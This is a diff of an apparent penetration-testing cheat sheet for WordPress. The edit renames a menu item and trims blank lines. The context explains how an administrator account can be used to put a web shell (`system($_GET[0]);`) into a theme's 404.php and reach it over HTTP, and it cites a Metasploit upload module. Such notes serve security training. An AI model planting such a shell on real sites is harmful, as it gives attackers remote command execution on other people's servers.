@@ -50,7 +50,7 @@
 ### Code Execution <a href="#code-execution" id="code-execution"></a>
 
 * With administrative access to WordPress, we can modify the PHP source code to execute system commands.
-* Click on `Appearance` on the side panel and select Theme Editor. This page will let us edit the PHP source code directly. An inactive theme can be selected to avoid corrupting the primary theme.
+* Click on `Appearance` on the side panel and select Theme File Editor. This page will let us edit the PHP source code directly. An inactive theme can be selected to avoid corrupting the primary theme.
 * Click on `Select` after selecting the theme, and we can edit an uncommon page such as `404.php` to add a web shell.
   * `system($_GET[0]);`  <sup><sub>(code to be added to the theme's php file)<sub></sup>
 * Click on `Update File` at the bottom to save. We know that WordPress themes are located at `/wp-content/themes/<theme name>`. We can interact with the web shell via the browser or using `cURL`.
@@ -58,22 +58,3 @@
 * Use [wp\_admin\_shell\_upload](https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_admin_shell_upload/) metasploit module as well.
 
 ### Leveraging Known Vulnerabilities <a href="#leveraging-known-vulnerabilities" id="leveraging-known-vulnerabilities"></a>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
